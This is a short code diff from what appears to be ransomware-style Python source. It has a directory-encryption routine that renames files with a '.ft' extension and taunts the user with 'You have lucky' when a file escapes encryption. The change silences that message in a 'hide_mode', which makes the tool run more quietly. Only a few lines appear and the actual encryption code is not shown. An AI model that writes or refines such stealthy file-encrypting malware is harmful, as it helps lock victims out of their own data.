@@ -84,7 +84,7 @@ def encrypt_directory(hide_mode, file_list):
                 if not hide_mode: 
                     print('[+]',file.name,'>>>',file.name + '.ft')
             except:
-                print('[*] You have lucky >>>',file)
+                if not hide_mode: print('[*] You have lucky >>>',file)
                                   
 
 def desencrypt_directory(file_list):
